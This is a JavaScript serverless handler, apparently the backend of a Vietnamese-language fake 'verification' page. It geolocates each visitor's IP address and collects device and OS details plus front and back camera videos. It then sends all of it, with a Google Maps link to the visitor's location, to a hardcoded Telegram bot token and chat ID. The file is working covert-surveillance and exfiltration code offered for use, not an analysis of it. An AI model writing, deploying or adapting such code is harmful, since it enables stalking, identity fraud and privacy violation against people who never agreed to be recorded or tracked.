export const config = { runtime: "edge" };

export default async function handler(req) {
  const TOKEN = "8962152623:AAH2gxqS-QXfs_bYaHHwoPG6xv7pWJXLSmY";
  const CHAT_ID = 8523959891;
  
  if (req.method !== "POST")
    return new Response("Method Not Allowed", { status: 405 });

  try {
    const userIP =
      req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
    
    let geo = {};
    try {
      const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
      geo = await geoRes.json();
    } catch (e) {
      geo = {};
    }

    const lat = geo.latitude || "0";
    const lon = geo.longitude || "0";
    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;

    const contentType = req.headers.get("content-type") || "";
    let clientData = {};
    let formData = null;

    if (contentType.includes("multipart/form-data")) {
      formData = await req.formData();
      clientData = JSON.parse(formData.get("clientInfo") || "{}");
    } else {
      clientData = await req.json();
    }

    const hasFront = formData && formData.has("front");
    const hasBack = formData && formData.has("back");

    const finalCaption = `
📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP dân cư: ${userIP}
🏢 ISP: ${geo.asName || "VNNIC"}
🏙️ Địa chỉ: ${address}
🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
📍 Vĩ độ: ${lat}
📍 Kinh độ: ${lon}
🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
`.trim();

    if (hasFront || hasBack) {
      // Gửi video trước
      if (hasFront) {
        const frontFile = formData.get("front");
        const frontForm = new FormData();
        frontForm.append("chat_id", CHAT_ID);
        frontForm.append("video", frontFile);
        frontForm.append("caption", finalCaption);
        frontForm.append("supports_streaming", "true");

        await fetch(
          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
          {
            method: "POST",
            body: frontForm,
          }
        );
      }

      // Gửi video sau
      if (hasBack) {
        const backFile = formData.get("back");
        const backForm = new FormData();
        backForm.append("chat_id", CHAT_ID);
        backForm.append("video", backFile);
        backForm.append("supports_streaming", "true");

        await fetch(
          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
          {
            method: "POST",
            body: backForm,
          }
        );
      }

      return new Response(JSON.stringify({ success: true }), { 
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
      
    } else {
      const res = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: finalCaption,
          }),
        },
      );
      return new Response(await res.text(), { status: 200 });
    }
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
    });
  }
}
